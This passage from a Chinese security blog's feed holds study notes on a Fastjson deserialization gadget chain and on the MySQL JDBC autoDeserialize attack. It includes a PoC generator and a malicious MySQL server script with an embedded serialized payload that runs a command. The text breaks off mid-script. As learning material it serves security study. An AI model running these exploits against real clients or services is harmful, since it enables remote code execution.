(ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得hashmap的数组</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> Array.newInstance(nodeC,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(jsonObject);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;1cfh&quot;</span>));</span><br><span class="line"></span><br><span class="line">        Array.set(object,<span class="number">0</span>,nodeCons.newInstance(<span class="number">0</span>,h1,h1,<span class="literal">null</span>));</span><br><span class="line">        Array.set(object,<span class="number">1</span>,nodeCons.newInstance(<span class="number">0</span>,h2,h2,<span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line">        setFieldValue(s,<span class="string">&quot;table&quot;</span>,object);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(s);</span><br><span class="line">            <span class="comment">// 先base64编码再URL编码</span></span><br><span class="line">            System.out.println(URLEncoder.encode(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())),<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">            outputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; nodeC;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">nodeCons.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>其中此部分对应于</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501082156785.png" alt="image-20250108215633685"></p><p>调试过程：</p><p>在给定一个readObject后，经过一系列流准备与反射调用后，来到Hashmap的readObject</p><p>然后就是恢复映射关系，需要调用putVal</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501082110055.png" alt="image-20250108211023908"></p><p>在poc中，我们设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashmap s:</span><br><span class="line">&quot;table&quot; -&gt; hashmap Array&#123;</span><br><span class="line">index 0: Node HotSwappableTargetSource h1-&gt; Node HotSwappableTargetSource h1</span><br><span class="line">index 1: Node HotSwappableTargetSource h2-&gt; Node HotSwappableTargetSource h2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要检验一次hash是否碰撞，因此借一步调用了HotSwappableTargetSource.equals</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501082147948.png" alt="image-20250108214752818"></p><p>注意HotSwappableTargetSource.equals调用了target的比较，即它封装的对象的比较</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501082159861.png" alt="image-20250108215950748"></p><p>于是在XString中调用了equals，所以进一步导致了JSONObject的toString的调用</p><p>后续就调用了getter</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501082202188.png" alt="image-20250108220207072"></p><p>TemplatesImpl的getter</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501082203110.png" alt="image-20250108220333988"></p><h3 id="Fastjson高版本"><a href="#Fastjson高版本" class="headerlink" title="Fastjson高版本"></a>Fastjson高版本</h3><p>先放着有空再回头看看，参考：</p><p><a href="https://xz.aliyun.com/t/14872?time__1311=GqA2Y50K4IxBqDwqeqBKKAIqU4mODEo=oD#toc-0">https://xz.aliyun.com/t/14872?time__1311=GqA2Y50K4IxBqDwqeqBKKAIqU4mODEo%3DoD#toc-0</a></p><p><a href="https://xz.aliyun.com/t/12728?time__1311=GqGxu7G=iQdmqGN4CxU2Df2h5KGQq7ezW4D#toc-0">https://xz.aliyun.com/t/12728?time__1311=GqGxu7G%3DiQdmqGN4CxU2Df2h5KGQq7ezW4D#toc-0</a></p><blockquote><ol><li><p><strong>1.2.24版本</strong></p><ul><li>没有任何过滤器，可以使用任何类进行反序列化攻击。</li><li>典型攻击类：<code>TemplatesImpl</code>、<code>JdbcRowSetImpl</code>。</li></ul></li><li><p><strong>1.2.25版本</strong></p><ul><li>引入<code>checkAutoType</code>机制，加入黑名单和白名单。</li><li>AutoType机制开启<ul><li>先检查白名单，白名单中的类直接加载。</li><li>若不在白名单，继续检查黑名单，若不在黑名单，正常加载。</li></ul></li><li>AutoType机制关闭<ul><li>先检查黑名单，若类在黑名单中则抛出异常。</li><li>再检查白名单，若不在白名单则抛出异常。</li></ul></li></ul></li><li><p><strong>1.2.42版本</strong></p><ul><li>加入对<code>L;</code>的检测，发现<code>L;</code>则去除。</li><li>黑名单和白名单类名隐去，使用hash比对。</li></ul></li><li><p><strong>1.2.43版本</strong></p><ul><li>加入对<code>LL;;</code>的检测，发现<code>LL;;</code>则去除。</li><li>通过引入对<code>[</code>字符的检测进行进一步防护。</li></ul></li><li><p><strong>1.2.45版本</strong></p><ul><li>黑名单机制问题：黑名单无法穷尽所有恶意类。</li></ul></li><li><p><strong>1.2.47版本</strong></p><ul><li>开启AutoType且版本在33到47之间<ul><li>若类不在白名单，则继续检查黑名单。</li><li>若类不在黑名单且不在mappings中，则正常加载。</li><li>关键问题在于如何往mappings中添加恶意类。</li></ul></li><li><strong>未开启AutoType且版本在24到32之间</strong>，也存在漏洞。</li></ul></li><li><p><strong>1.2.68版本</strong></p><ul><li><p>引入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expectedClass</span><br></pre></td></tr></table></figure><p>机制，增加了防护，但仍存在逻辑漏洞：</p><ul><li>特别是针对<code>Throwable</code>类的防护不足。</li></ul></li></ul></li><li><p>1.2.80版本</p><p><strong>异常类漏洞防护</strong></p><ul><li>针对<code>Throwable</code>类及其子类的漏洞防护不足进行了增强，防止利用这些类进行攻击。</li></ul></li></ol></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDBC攻击其一</title>
      <link href="/2024/12/27/WebExploit/Java/JDBCAttack1/"/>
      <url>/2024/12/27/WebExploit/Java/JDBCAttack1/</url>
      
        <content type="html"><![CDATA[<h1 id="JDBC攻击学习记录1"><a href="#JDBC攻击学习记录1" class="headerlink" title="JDBC攻击学习记录1"></a>JDBC攻击学习记录1</h1><h2 id="JDBC简介"><a href="#JDBC简介" class="headerlink" title="JDBC简介"></a>JDBC简介</h2><p>JDBC（Java DataBase Connectivity），是一种用于执行Sql语句的Java API，即Java数据库连接。</p><p>一般是数据库厂商会对接好Java API，使得开发人员可以使用统一的接口访问多种关系数据库</p><h2 id="Java序列化魔数"><a href="#Java序列化魔数" class="headerlink" title="Java序列化魔数"></a>Java序列化魔数</h2><p>这里的 <code>AC ED</code> 是魔数，<code>00 05</code> 是版本号。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271425837.png" alt="image-20241224194855499"></p><h2 id="MySQL-JDBC-Attack"><a href="#MySQL-JDBC-Attack" class="headerlink" title="MySQL JDBC Attack"></a>MySQL JDBC Attack</h2><p>Mysql JDBC 中包含一个危险的扩展参数： ”<strong>autoDeserialize</strong>“。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据，这就产生了 RCE。</p><h3 id="寻找readObject"><a href="#寻找readObject" class="headerlink" title="寻找readObject"></a>寻找readObject</h3><p>直接看<code>com.mysql.cj.jdbc.result.ResultSetImpl</code>中的<code>getObject</code>函数</p><p>里面直接一个明晃晃的readObject了</p><p>注意在上面的if判断中判断力Java序列化文件的魔术：<code>AC</code>对应于<code>-84</code> ，<code>ED</code>对应于<code>-19</code></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412242132405.png" alt="image-20241224213212873"></p><p>调用getObject的方法在<code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</code>，</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271426534.png" alt="image-20241224214132377"></p><p>一个<code>rs.getObject</code>函数</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271426582.png" alt="image-20241224214202842"></p><p>注意rs是执行<code>rs = stmt.executeQuery(&quot;SHOW SESSION STATUS&quot;);</code>之后的返回结果，且声明为ResultSet接口</p><p>由Java多态，若部署一个恶意MySQL服务器，使得返回结果为ResultSetImpl实例，那么就能拼接到上述的getObject函数</p><h3 id="从流量角度查看Mysql认证报文"><a href="#从流量角度查看Mysql认证报文" class="headerlink" title="从流量角度查看Mysql认证报文"></a>从流量角度查看Mysql认证报文</h3><p>起一个客户端去访问我们已经部署好的MySQL服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.jdbcdemo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> com.mysql.cj.jdbc.result.ResultSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdbcMain</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">Driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">DB_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/root?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载JDBC驱动</span></span><br><span class="line">        Class.forName(Driver);</span><br><span class="line">        <span class="comment">// 用户名和密码</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(DB_URL, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">        <span class="comment">// 执行MySQL语句</span></span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(<span class="string">&quot;select * from users&quot;</span>);</span><br><span class="line">        <span class="comment">// 如果有数据, rs.next()返回true</span></span><br><span class="line">        <span class="keyword">while</span>(resultSet.next())&#123;</span><br><span class="line">            System.out.println(resultSet.getString(<span class="string">&quot;user_id&quot;</span>) + <span class="string">&quot;:&quot;</span> + resultSet.getString(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>筛选<code>mysql</code>报文<code>tcp.port==3306 &amp;&amp; mysql</code></p><p>Request：MySQL Client -&gt; MySQL Server</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271426002.png" alt="image-20241224221628844"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271426877.png" alt="image-20241224221545305"></p><ul><li>返回内容，反正就是一坨，会在客户端反序列化</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271426922.png" alt="image-20241224221851238"></p><ul><li>reponse</li></ul><p>一个MySQL Response OK报文如下：</p><p><code>07 00 00 01 00 00 00 02 00 00 00</code>，即客户端只要接收到这几个字节就完成了一次MySQL交互</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271426311.png" alt="image-20241224220538329"></p><h3 id="ServerStatusDiffInterceptor链"><a href="#ServerStatusDiffInterceptor链" class="headerlink" title="ServerStatusDiffInterceptor链"></a>ServerStatusDiffInterceptor链</h3><p>查看一下mysql-connector-java的版本</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="8-0-7-8-0-20"><a href="#8-0-7-8-0-20" class="headerlink" title="8.0.7-8.0.20"></a>8.0.7-8.0.20</h4><p>参考恶意server：<a href="https://xz.aliyun.com/t/8159?time__1311=n4+xnD0Dc7GQDtY40KDsA3xCq7KP4YvK0o=wXQx#toc-3">https://xz.aliyun.com/t/8159?time__1311=n4%2BxnD0Dc7GQDtY40KDsA3xCq7KP4YvK0o%3DwXQx#toc-3</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#@Time : 2020/7/27 2:10</span></span><br><span class="line"><span class="comment">#@Author: Tri0mphe7</span></span><br><span class="line"><span class="comment">#@File : server.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  &quot;calc&quot; &gt; a </span></span><br><span class="line">    file= <span class="string">r&#x27;a&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span 